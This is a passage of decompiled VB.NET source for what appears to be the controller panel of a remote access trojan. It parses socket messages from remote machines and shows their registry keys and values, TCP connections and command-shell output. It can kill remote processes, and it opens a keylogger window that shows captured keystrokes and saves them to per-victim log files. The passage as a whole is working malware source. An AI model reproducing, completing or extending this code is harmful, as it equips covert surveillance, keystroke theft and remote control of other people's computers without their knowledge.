                    Dim _data18 As _data = New _data(AddressOf Me.data)
                    Me.Invoke(_data18, New Object() {sock, b})
                    Return
                End If
                Dim manager40 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(1))), System_Manager)
                Dim strArray18 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(2))), "*GPI*", -1, CompareMethod.Binary)
                Dim num66 As Integer = (strArray18.Length - 2)
                Dim num23 As Integer = 0
                Do While (num23 <= num66)
                    If (My.Application.OpenForms.Item(("System Manager" & strArray(1))) Is Nothing) Then
                        Me.s.Send(sock, "Abort")
                        Exit Do
                    End If
                    If (strArray18(num23).ToString.Length > 0) Then
                        Dim str10 As String = String.Empty
                        If (strArray18((num23 + 1)) = Nothing) Then
                            str10 = "-"
                        Else
                            str10 = strArray18((num23 + 1))
                        End If
                        manager40.ImageList1.Images.Add(strArray18(num23), New Bitmap(Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray18((num23 + 2)))))))
                        manager40.PIIT.Items.Add(strArray18(num23), strArray18(num23), strArray18(num23)).SubItems.Add(str10)
                    End If
                    num23 = (num23 + 2)
                    num23 += 1
                Loop
                Try
                    manager40.PIIT.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                Catch exception67 As Exception
                End Try
                manager40.PIIT.Enabled = True
                Return
            End If
            Select Case str13
                Case "Get Sub Keys Names"
                    If Me.InvokeRequired Then
                        Dim _data19 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data19, New Object() {sock, b})
                    Else
                        Dim manager42 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(3))), System_Manager)
                        manager42.KeysName.Enabled = True
                        manager42.RegValues.Enabled = True
                        manager42.Panel3.Enabled = True
                        manager42.ToolStripStatusLabel7.Text = "List of sub keys and values successfully created"
                        manager42.RegPath.Text = Conversions.ToString(Operators.ConcatenateObject(SocketServer.Decode(strArray(2)), "\"))
                        Dim strArray20 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "|x|", -1, CompareMethod.Binary)
                        Dim num67 As Integer = (strArray20.Length - 2)
                        Dim num24 As Integer = 0
                        Do While (num24 <= num67)
                            manager42.KeysName.Items.Add(strArray20(num24), 0)
                            num24 += 1
                        Loop
                        Dim strArray21 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(4))), "|x|", -1, CompareMethod.Binary)
                        Dim num68 As Integer = (strArray21.Length - 2)
                        Dim num25 As Integer = 0
                        Do While (num25 <= num68)
                            Dim obj4 As Object
                            If (strArray21((num25 + 1)) = "String") Then
                                obj4 = manager42.ValuesRegName.Items.Add(strArray21(num25), 1)
                            Else
                                obj4 = manager42.ValuesRegName.Items.Add(strArray21(num25), 2)
                            End If
                            objArray2 = New Object(1 - 1) {}
                            strArray44 = strArray21
                            num52 = (num25 + 1)
                            objArray2(0) = strArray44(num52)
                            objArray = objArray2
                            flagArray = New Boolean() {True}
                            NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                            If flagArray(0) Then
                                strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                            End If
                            objArray2 = New Object(1 - 1) {}
                            strArray44 = strArray21
                            num52 = (num25 + 2)
                            objArray2(0) = strArray44(num52)
                            objArray = objArray2
                            flagArray = New Boolean() {True}
                            NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                            If flagArray(0) Then
                                strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                            End If
                            num25 = (num25 + 2)
                            num25 += 1
                        Loop
                        manager42.ValuesRegName.Enabled = True
                    End If
                    Return
                Case "Enter To Sub Key"
                    If Me.InvokeRequired Then
                        Dim _data20 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data20, New Object() {sock, b})
                    Else
                        Dim manager43 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
                        manager43.KeysName.Enabled = True
                        manager43.RegValues.Enabled = True
                        manager43.Panel3.Enabled = True
                        manager43.ValuesRegName.Enabled = True
                        manager43.ToolStripStatusLabel7.Text = "List of sub keys successfully created"
                        If (strArray(1) <> "open! Police here") Then
                            Dim strArray22 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "|x|", -1, CompareMethod.Binary)
                            Dim num69 As Integer = (strArray22.Length - 2)
                            Dim num26 As Integer = 0
                            Do While (num26 <= num69)
                                manager43.KeysName.Items.Add(strArray22(num26), 0)
                                num26 += 1
                            Loop
                            Dim strArray23 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(3))), "|x|", -1, CompareMethod.Binary)
                            Dim num70 As Integer = (strArray23.Length - 2)
                            Dim num27 As Integer = 0
                            Do While (num27 <= num70)
                                Dim obj5 As Object
                                If (strArray23((num27 + 1)) = "String") Then
                                    obj5 = manager43.ValuesRegName.Items.Add(strArray23(num27), 1)
                                Else
                                    obj5 = manager43.ValuesRegName.Items.Add(strArray23(num27), 2)
                                End If
                                objArray2 = New Object(1 - 1) {}
                                strArray44 = strArray23
                                num52 = (num27 + 1)
                                objArray2(0) = strArray44(num52)
                                objArray = objArray2
                                flagArray = New Boolean() {True}
                                NewLateBinding.LateCall(NewLateBinding.LateGet(obj5, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                If flagArray(0) Then
                                    strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                End If
                                objArray2 = New Object(1 - 1) {}
                                strArray44 = strArray23
                                num52 = (num27 + 2)
                                objArray2(0) = strArray44(num52)
                                objArray = objArray2
                                flagArray = New Boolean() {True}
                                NewLateBinding.LateCall(NewLateBinding.LateGet(obj5, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                If flagArray(0) Then
                                    strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                End If
                                num27 = (num27 + 2)
                                num27 += 1
                            Loop
                        End If
                    End If
                    Return
                Case "Values Names"
                    If Me.InvokeRequired Then
                        Dim _data21 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data21, New Object() {sock, b})
                    Else
                        Dim manager44 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
                        Dim strArray24 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "|x|", -1, CompareMethod.Binary)
                        Dim num71 As Integer = (strArray24.Length - 2)
                        Dim num28 As Integer = 0
                        Do While (num28 <= num71)
                            Dim obj6 As Object
                            If (strArray24((num28 + 1)) = "String") Then
                                obj6 = manager44.ValuesRegName.Items.Add(strArray24(num28), 1)
                            Else
                                obj6 = manager44.ValuesRegName.Items.Add(strArray24(num28), 2)
                            End If
                            objArray2 = New Object(1 - 1) {}
                            strArray44 = strArray24
                            num52 = (num28 + 1)
                            objArray2(0) = strArray44(num52)
                            objArray = objArray2
                            flagArray = New Boolean() {True}
                            NewLateBinding.LateCall(NewLateBinding.LateGet(obj6, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                            If flagArray(0) Then
                                strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                            End If
                            objArray2 = New Object(1 - 1) {}
                            strArray44 = strArray24
                            num52 = (num28 + 2)
                            objArray2(0) = strArray44(num52)
                            objArray = objArray2
                            flagArray = New Boolean() {True}
                            NewLateBinding.LateCall(NewLateBinding.LateGet(obj6, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                            If flagArray(0) Then
                                strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                            End If
                            num28 = (num28 + 2)
                            num28 += 1
                        Loop
                    End If
                    Return
                Case "Registry Result"
                    Dim manager45 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(3))), System_Manager)
                    If Operators.ConditionalCompareObjectEqual(SocketServer.Decode(strArray(1)), "Done!", False) Then
                        manager45.ValuesRegName.Enabled = True
                        manager45.ToolStripStatusLabel7.Text = "List of values successfully created"
                    Else
                        manager45.ToolStripStatusLabel7.Text = Conversions.ToString(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)))
                    End If
                    Return
                Case "RSYR"
                    Dim manager46 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(3))), System_Manager)
                    manager46.ToolStripStatusLabel7.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), " "), strArray(2)))
                    Return
                Case "Get Connections"
                    If Me.InvokeRequired Then
                        Dim _data22 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data22, New Object() {sock, b})
                    Else
                        Dim obj7 As Object
                        Dim manager51 As System_Manager
                        Dim manager47 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(1))), System_Manager)
                        If Not clsCompressedString.Decode(strArray(2)).ToString.Contains("NTICBLAREVREV") Then
                            Dim strArray25 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(2))), "TCPPlugin", -1, CompareMethod.Binary)
                            Dim num29 As Integer = 0
                            Try
                                Dim num72 As Integer = (strArray25.Length - 2)
                                Dim num30 As Integer = 0
                                Do While (num30 <= num72)
                                    If (manager47.Established = 0) Then
                                        manager47.TCPC.Groups.Add("", "Established ( 0 )")
                                        manager51 = manager47
                                        manager51.Established += 1
                                    End If
                                    obj7 = manager47.TCPC.Items.Add(New ListViewItem(New String() {strArray25(num30)}, 0, manager47.TCPC.Groups.Item((manager47.TCPC.Groups.Count - 1))))
                                    NewLateBinding.LateSet(obj7, Nothing, "ForeColor", New Object() {Color.Green}, Nothing, Nothing)
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray25
                                    num52 = (num30 + 1)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray25
                                    num52 = (num30 + 2)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray25
                                    num52 = (num30 + 3)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray25
                                    num52 = (num30 + 4)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    num30 = (num30 + 4)
                                    num29 += 1
                                    num30 += 1
                                Loop
                            Catch exception68 As Exception
                            End Try
                            Try
                                Dim enumerator28 As IEnumerator
                                Try
                                    enumerator28 = manager47.TCPC.Groups.GetEnumerator
                                    Do While enumerator28.MoveNext
                                        Dim group7 As ListViewGroup = DirectCast(enumerator28.Current, ListViewGroup)
                                        If (group7.Header = "Established ( 0 )") Then
                                            group7.Header = "Established ( 0 )".Replace("0", Conversions.ToString(num29))
                                        End If
                                    Loop
                                Finally
                                End Try
                            Catch exception69 As Exception
                            End Try
                        End If
                        If Not clsCompressedString.Decode(strArray(3)).ToString.Contains("NTICBLAREVREV") Then
                            Dim strArray26 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(3))), "TCPPlugin", -1, CompareMethod.Binary)
                            Dim num31 As Integer = 0
                            Try
                                Dim num73 As Integer = (strArray26.Length - 2)
                                Dim num32 As Integer = 0
                                Do While (num32 <= num73)
                                    If (manager47.CloseWait = 0) Then
                                        manager47.TCPC.Groups.Add("", "Close Wait ( 0 )")
                                        manager51 = manager47
                                        manager51.CloseWait += 1
                                    End If
                                    obj7 = manager47.TCPC.Items.Add(New ListViewItem(New String() {strArray26(num32)}, 1, manager47.TCPC.Groups.Item((manager47.TCPC.Groups.Count - 1))))
                                    NewLateBinding.LateSet(obj7, Nothing, "ForeColor", New Object() {Color.Red}, Nothing, Nothing)
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray26
                                    num52 = (num32 + 1)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray26
                                    num52 = (num32 + 2)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray26
                                    num52 = (num32 + 3)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray26
                                    num52 = (num32 + 4)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    num32 = (num32 + 4)
                                    num31 += 1
                                    num32 += 1
                                Loop
                            Catch exception70 As Exception
                            End Try
                            Try
                                Dim enumerator29 As IEnumerator
                                Try
                                    enumerator29 = manager47.TCPC.Groups.GetEnumerator
                                    Do While enumerator29.MoveNext
                                        Dim group8 As ListViewGroup = DirectCast(enumerator29.Current, ListViewGroup)
                                        If (group8.Header = "Close Wait ( 0 )") Then
                                            group8.Header = "Close Wait ( 0 )".Replace("0", Conversions.ToString(num31))
                                        End If
                                    Loop
                                Finally
                                End Try
                            Catch exception71 As Exception
                            End Try
                        End If
                        If Not clsCompressedString.Decode(strArray(4)).ToString.Contains("NTICBLAREVREV") Then
                            Dim strArray27 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(4))), "TCPPlugin", -1, CompareMethod.Binary)
                            Dim num33 As Integer = 0
                            Try
                                Dim num74 As Integer = (strArray27.Length - 2)
                                Dim num34 As Integer = 0
                                Do While (num34 <= num74)
                                    If (manager47.Listen = 0) Then
                                        manager47.TCPC.Groups.Add("", "Listening ( 0 )")
                                        manager51 = manager47
                                        manager51.Listen += 1
                                    End If
                                    obj7 = manager47.TCPC.Items.Add(New ListViewItem(New String() {strArray27(num34)}, 5, manager47.TCPC.Groups.Item((manager47.TCPC.Groups.Count - 1))))
                                    NewLateBinding.LateSet(obj7, Nothing, "ForeColor", New Object() {Color.DarkSlateGray}, Nothing, Nothing)
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray27
                                    num52 = (num34 + 1)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray27
                                    num52 = (num34 + 2)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray27
                                    num52 = (num34 + 3)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray27
                                    num52 = (num34 + 4)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    num34 = (num34 + 4)
                                    num33 += 1
                                    num34 += 1
                                Loop
                            Catch exception72 As Exception
                            End Try
                            Try
                                Dim enumerator30 As IEnumerator
                                Try
                                    enumerator30 = manager47.TCPC.Groups.GetEnumerator
                                    Do While enumerator30.MoveNext
                                        Dim group9 As ListViewGroup = DirectCast(enumerator30.Current, ListViewGroup)
                                        If (group9.Header = "Listening ( 0 )") Then
                                            group9.Header = "Listening ( 0 )".Replace("0", Conversions.ToString(num33))
                                        End If
                                    Loop
                                Finally
                                End Try
                            Catch exception73 As Exception
                            End Try
                        End If
                        If Not clsCompressedString.Decode(strArray(5)).ToString.Contains("NTICBLAREVREV") Then
                            Dim strArray28 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(5))), "TCPPlugin", -1, CompareMethod.Binary)
                            Dim num35 As Integer = 0
                            Try
                                Dim num75 As Integer = (strArray28.Length - 2)
                                Dim num36 As Integer = 0
                                Do While (num36 <= num75)
                                    If (manager47.Time_Wait = 0) Then
                                        manager47.TCPC.Groups.Add("", "Time Wait ( 0 )")
                                        manager51 = manager47
                                        manager51.Time_Wait += 1
                                    End If
                                    obj7 = manager47.TCPC.Items.Add(New ListViewItem(New String() {strArray28(num36)}, 6, manager47.TCPC.Groups.Item((manager47.TCPC.Groups.Count - 1))))
                                    NewLateBinding.LateSet(obj7, Nothing, "ForeColor", New Object() {Color.Orange}, Nothing, Nothing)
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray28
                                    num52 = (num36 + 1)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray28
                                    num52 = (num36 + 2)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray28
                                    num52 = (num36 + 3)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    objArray2 = New Object(1 - 1) {}
                                    strArray44 = strArray28
                                    num52 = (num36 + 4)
                                    objArray2(0) = strArray44(num52)
                                    objArray = objArray2
                                    flagArray = New Boolean() {True}
                                    NewLateBinding.LateCall(NewLateBinding.LateGet(obj7, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                    If flagArray(0) Then
                                        strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                    End If
                                    num36 = (num36 + 4)
                                    num35 += 1
                                    num36 += 1
                                Loop
                            Catch exception74 As Exception
                            End Try
                            Try
                                Dim enumerator31 As IEnumerator
                                Try
                                    enumerator31 = manager47.TCPC.Groups.GetEnumerator
                                    Do While enumerator31.MoveNext
                                        Dim group10 As ListViewGroup = DirectCast(enumerator31.Current, ListViewGroup)
                                        If (group10.Header = "Time Wait ( 0 )") Then
                                            group10.Header = "Time Wait ( 0 )".Replace("0", Conversions.ToString(num35))
                                        End If
                                    Loop
                                Finally
                                End Try
                            Catch exception75 As Exception
                            End Try
                        End If
                        manager47.TCPC.Enabled = True
                        manager47.ToolStripStatusLabel6.Text = ("List of tcp connections successfully created - TCP Connections : ( " & Conversions.ToString(manager47.TCPC.Items.Count) & " )")
                        manager47.TCPC.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End If
                    Return
                Case "PIS"
                    Dim manager41 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(1))), System_Manager)
                    If (strArray(2) <> "Done!") Then
                        Dim strArray19 As String() = Strings.Split(strArray(2), "____", -1, CompareMethod.Binary)
                        manager41.ToolStripStatusLabel9.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(SocketServer.Decode(strArray19(0)), " "), strArray19(1)))
                        If Not strArray19(1).Contains("Unsuccessfully") Then
                            Dim enumerator27 As IEnumerator
                            Try
                                enumerator27 = manager41.PIIT.Items.GetEnumerator
                                Do While enumerator27.MoveNext
                                    Dim item34 As ListViewItem = DirectCast(enumerator27.Current, ListViewItem)
                                    If Operators.ConditionalCompareObjectEqual(item34.SubItems.Item(0).Text, SocketServer.Decode(strArray19(0)), False) Then
                                        item34.Remove()
                                        Return
                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                    Else
                        manager41.ToolStripStatusLabel9.Text = "List of pinned items successfully created"
                        manager41.PIIT.Enabled = True
                    End If
                    Return
                Case Else
                    Select Case str13
                        Case "ERR"
                            Dim manager48 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(1))), System_Manager)
                            manager48.TCPC.Enabled = True
                            manager48.ToolStripStatusLabel6.Text = "List of tcp connections unuccessfully created"
                            Return
                        Case "KillTCPProcess"
                            Dim enumerator32 As IEnumerator
                            Dim manager49 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
                            Try
                                enumerator32 = manager49.TCPC.Items.GetEnumerator
                                Do While enumerator32.MoveNext
                                    Dim item35 As ListViewItem = DirectCast(enumerator32.Current, ListViewItem)
                                    If Operators.ConditionalCompareObjectEqual(item35.SubItems.Item(1).Text, SocketServer.Decode(strArray(1)), False) Then
                                        item35.Remove()
                                    End If
                                Loop
                            Finally
                            End Try
                            manager49.ToolStripStatusLabel6.Text = ("All TCP Connections : " & Conversions.ToString(manager49.TCPC.Items.Count))
                            Return
                        Case "WirteLines"
                            Try
                                Dim manager50 As System_Manager = DirectCast(My.Application.OpenForms.Item(("System Manager" & strArray(2))), System_Manager)
                                If ((Not My.Application.OpenForms.Item(("System Manager" & strArray(2))) Is Nothing) AndAlso (manager50.StartToolStripMenuItem1.Text = "Stop")) Then
                                    manager50.ResultCMD.Cursor = Nothing
                                    manager50.ResultCMD.AppendText((Functions.DEB(strArray(1)) & ChrW(13) & ChrW(10)))
                                End If
                            Catch exception76 As Exception
                                ProjectData.SetProjectError(exception76)
                                ProjectData.ClearProjectError()
                            End Try
                            Return
                        Case "Pastime"
                            If (Not My.Application.OpenForms.Item(("Pastime" & strArray(3))) Is Nothing) Then
                                Me.s.Send(Conversions.ToInteger(strArray(3)), "Abort")
                            ElseIf Me.InvokeRequired Then
                                Dim _data23 As _data = New _data(AddressOf Me.data)
                                Me.Invoke(_data23, New Object() {sock, b})
                            Else
                                Dim pastime As New Pastime
                                pastime.Sock = sock
                                pastime.Name = ("Pastime" & strArray(3))
                                pastime.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Pastime : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                                pastime.Show()
                            End If
                            Return
                        Case "KE"
                            If (My.Application.OpenForms.Item(("KE" & strArray(2))) Is Nothing) Then
                                If Me.InvokeRequired Then
                                    Dim _data24 As _data = New _data(AddressOf Me.data)
                                    Me.Invoke(_data24, New Object() {sock, b})
                                Else
                                    Dim keylogger As New Keylogger
                                    keylogger.Sock = sock
                                    keylogger.Name = ("KE" & strArray(2))
                                    keylogger.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Keylogger : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                                    keylogger.Path = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), "\Logs\"))
                                    keylogger.Show()
                                End If
                            End If
                            Return
                        Case "KE Logs"
                            Dim keylogger2 As Keylogger = DirectCast(My.Application.OpenForms.Item(("KE" & strArray(2))), Keylogger)
                            If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(keylogger2.Old, SocketServer.Decode(strArray(1)), False))) Then
                                If (keylogger2.Logs.Text <> "") Then
                                    keylogger2.Logs.Text = ""
                                End If
                                Dim logs As TextBox = keylogger2.Logs
                                SyncLock logs
                                    keylogger2.Logs.AppendText(Conversions.ToString(SocketServer.Decode(strArray(1))))
                                End SyncLock
                                keylogger2.Logs.ScrollToCaret()

                                Try
                                    File.WriteAllText(String.Concat(New String() {keylogger2.Path, keylogger2.T, "\", keylogger2.TH, ".Log"}), Conversions.ToString(SocketServer.Decode(strArray(1))))
                                Catch exception77 As Exception
                                    ProjectData.SetProjectError(exception77)
                                    ProjectData.ClearProjectError()
                                End Try
                            End If
                            Return
                        Case "System Information"
